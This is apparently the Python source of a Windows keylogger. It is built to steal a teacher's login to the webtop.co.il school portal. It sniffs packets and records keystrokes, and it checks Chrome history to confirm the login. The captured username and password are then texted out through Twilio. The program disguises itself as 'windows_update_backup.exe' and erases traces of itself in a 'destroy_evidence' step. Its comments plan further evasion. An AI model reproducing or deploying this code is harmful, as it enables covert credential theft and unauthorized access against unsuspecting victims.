from scapy.all import sniff  # packet capture module
import socket  # to find webtop ip
import threading  # to use both the keylogger and the packet sniffer
from pynput.keyboard import Listener  # to use for the keylogger
# import logging
import time  # to sleep for 11 seconds while the history page refreshes
import requests  # to send the password to Twilio so that it can send an sms to me
import sys
import os  # find where the history and startup folders are

PATH_TO_CONNECTIONS = os.environ['USERPROFILE'] + r"\Desktop\system\connections.txt"
counter = 0
INTERFACE = []
caps = False
caps_lock_on = False
shift = False
isTrue = False
PATH_TO_PROGRAM = os.environ['USERPROFILE'] + r"\Desktop\system\windows_update_backup.exe"
STARTUP_DIRECTORY = os.getenv('PROGRAMDATA') + r'\Microsoft\Windows\Start Menu\Programs\StartUp'
# The history file of chrome could also be in "profile 1" instead of "default" , need to check for both
HISTORY_FILE_OPTIONS = [os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Default\History",
                        os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Profile 1\History"]
FULL_URL = 'www.webtop.co.il/v2/default.aspx'
GOT_IN_AFTER_INCORRECT_TRY = 'www.webtop.co.il/v2/default.aspx?loginFailure=1&autoLoad=alert'
INCORRECT_LOGIN_URL = 'www.webtop.co.il/v2/default.aspx?loginFailure=1'

# logdir = os.environ['USERPROFILE'] + cm'\\Desktop\\'
# logdir = r"C:/Users/Admin/Documents/Yehonatan/Cyber/project/"
# Uploads logged keys to a file called klog-res.txt
# logging.basicConfig(filename=(logdir + "123.txt"), level=logging.INFO, format="%(message)s")
# logs the keys to file
LIST_OF_SPECIALS = ["Key.tab", "Key.caps_lock", "Key.shift", "Key.ctrl_l", "Key.cmd", "Key.alt_l",
                    "Key.alt_r", "Key.menu", "Key.left", "Key.down", "Key.right", "Key.up", "Key.insert",
                    "Key.delete", "Key.print_screen", "Key.home", "Key.end", "Key.page_up", "Key.page_down",
                    "Key.num_lock", "Key.f5", "Key.esc"]
username_and_password = ""
# Special symbols that can only be achieved with shift letter
special_numbers = {"1": "!", "2": "@", "3": "#", "4": "$",
                   "5": "%", "6": "^", "7": "&", "8": "*",
                   "9": "(", "0": ")", "=": "+", "-": "_", "/": "?", ",": "<", ".": ">"}


def on_press(key):
    """ When a key is being pressed, check if it is shift or caps lock. If so, change caps"""
    if str(key) == "Key.caps_lock" or str(key) == "Key.shift":
        change_caps(key)


def add_comma():
    """function mainly to separate the username and password if victim tabs between the username and password"""
    global username_and_password
    username_and_password += ","


def on_release(key):
    """ When a key is being released, check if you should add it to the message, ignore it or change the caps"""
    global shift
    global caps
    global LIST_OF_SPECIALS
    if str(key) == "Key.shift":
        change_caps(key)
    # print('{0} released'.format(key))
    elif str(key) in LIST_OF_SPECIALS:
        pass
    elif str(key) == "Key.backspace":
        delete_letter()
    elif str(key) == "Key.enter":
        make_newline()
    elif str(key) == "Key.tab":
        add_comma()
    else:
        add_password(key)


def make_newline():
    """ Makes a new line if the user hit the enter """
    global username_and_password
    username_and_password = username_and_password + "\n"


def delete_letter():
    """ Deletes a character if the user hit the backspace"""
    global username_and_password
    username_and_password = username_and_password[0:-1]


def add_password(key):
    """Adds the letter to the username and password"""
    global caps
    global shift
    global special_numbers
    global username_and_password
    if str(key).replace("'", "") in special_numbers and shift:
        username_and_password += special_numbers[str(key).replace("'", "")]
    else:
        if str(key) == "Key.space":
            letter = " "
        else:
            letter = str(key).replace("'", '')
        if caps:
            username_and_password += letter.upper()
        else:
            username_and_password += letter


def run_keylogger():
    """Starts the keylogger"""
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()


def change_caps(key):
    """ function to tell the program if it should store uppercase or lowercase"""
    global shift
    global caps
    global caps_lock_on
    if str(key) == "Key.caps_lock":
        if not caps:
            caps = True
        else:
            caps = False
    if str(key) == "Key.shift":
        if shift:
            shift = False
            caps = False
        else:
            caps = True
            shift = True
    return


def check_history():
    """Checks if the url of webtop once you log in is in the history file,
     returns True if in the file and False otherwise"""
    global counter
    global HISTORY_FILE_OPTIONS
    global FULL_URL
    global GOT_IN_AFTER_INCORRECT_TRY
    global INCORRECT_LOGIN_URL

    counter += 1
    print(counter)
    time.sleep(11)
    file = ""
    # It takes 11 seconds for history page to update
    for x in HISTORY_FILE_OPTIONS:
        try:
            file = open(x, 'r', encoding='latin-1')
        except FileNotFoundError as e:
            pass
    read = file.read()

    if FULL_URL in read and INCORRECT_LOGIN_URL not in read or GOT_IN_AFTER_INCORRECT_TRY in read:
        return True
    else:
        return False


def send_sms():
    """Sends a request to Twilio through the requests package of python to send an SMS to me. """
    """By using the requests package, the function sends a post request to Twilio which sends an sms to me with the 
    info of the password"""
    global username_and_password

    account_sid = "YOUR_ACOUNT_SID"
    # os.environ['ACCOUNT_SID']
    authentication_token = "YOUR_ACCOUNT_TOKEN"
    sender_number = "YOUR TWILIO NUMBER"
    # os.environ['AUTH_TOKEN']
    receiver_number = "PHONE NUMBER"
    # os.environ['MY_PHONE_NUMBER']
    # client = Client(account_sid, authentication_token)
    response = requests.post(
        f'https://api.twilio.com/2010-04-01/Accounts/{account_sid}/Messages.json',
        auth=(account_sid, authentication_token),
        data={
            "From": sender_number,
            "To": receiver_number,
            "Body": username_and_password
        })


def check_internet_sources():
    """  Check for the source of the internet connection to sniff through those. Using the txt file that contains
    the connections and their status that was checked before the program starts.
      The function will return the names of the sources of network active"""
    global INTERFACE
    global PATH_TO_CONNECTIONS
    file = open(PATH_TO_CONNECTIONS, 'r', encoding='utf-16')
    for line in file:
        line = line.strip()
        if line[-1] == "2" and line[-2] == " ":
            line = line[:-1]
            line = line.strip()
            INTERFACE.append(line)


def destroy_evidence():
    global PATH_TO_PROGRAM
    """This function will restore all the settings before the download of the program,
     the shortcut and the program itself"""
    os.remove(rf"{os.getenv('PROGRAMDATA')}\Microsoft\Windows\Start Menu\Programs\StartUp\test.lnk")
    os.system(f'icacls "{STARTUP_DIRECTORY}" /reset /t')
    #  os.remove(rf"{PATH_TO_PROGRAM}")


def main():
    """Starts the sniffing,starts the keylogger in run_keylogger and checks if user logged in by
     calling the check_history() function, logs the keylogger in log() function and exits code if they are."""
    global INTERFACE
    check_internet_sources()
    print('start')
    addr1 = socket.gethostbyname('webtop.co.il')
    sniff(iface=INTERFACE, filter=f"host {addr1}", count=40)
    tracker = threading.Thread(target=run_keylogger, daemon=True)
    tracker.setDaemon(True)
    tracker.start()

    while 1:
        sniff(iface=INTERFACE, filter=f"host {addr1}", count=1)
        logged_in = check_history()
        if logged_in:
            send_sms()
            # Leaving log function for now, if I have a use for storing with log instead of variable
            # log()
            destroy_evidence()
            sys.exit()
        else:
            print(f"failed try number {counter}")


if __name__ == "__main__":
    main()

# Further continue the program beyond product:

# 1) Make the keylogger deal with the shift after the victim entered username and password
# It is too slow now and can slightly miss Changes in shift and check generally for bugs

# 2) In the log of keylogger, every time the mouse is clicked, go to new line
# Need to think if this will not make things messier and if so fix that

# 3) For every time a webtop packet goes to sniffer, make a different thread to deal with it,
# so sniffer won't miss packets. For example, if put incorrect password, the main thread will wait 11 seconds before
# it checks again. This might be a problem if person inputs password in those 11 seconds

# 4) Check for bugs in general

# 5) Change the code so it will rename the history file and after the process is completed switch it back,
# to make it less suspicious.

# 6) Add for keylogger delete button that erases key after the cursor

# 7) Add a function that checks if the variable is close to reaching the max amount for a string (or for SMS),
# then puts it in a txt


# ASSUMPTIONS:
# Assuming that the teacher is not aware of history file and will not delete it right before the program starts
# Works only on windows
# Currently works only for webtop, though it can be changed slightly to find different websites.
# Works only on google chrome so far (could be changed to work on other applications that save the history in a file -
# Not in incognito mode for chrome


# DONE LIST:
# 1) When finding history, file can also be in os.getenv("LOCALAPPDATA") + r"\Google\Chrome\User Data\Profile 1\History
# Check for both
# 2) DONE  check for wifi or ethernet interface, it could be any one of those
# 3) Find way, after restart, to not delete history but only after first encounter
# 4) Use Twilio without the helper package - it takes too much and the download time take too long
# 5) The program will remove all traces of itself, the shortcut and any settings changes it did
# 6) The program will check for all internet interfaces and sniff through them all.
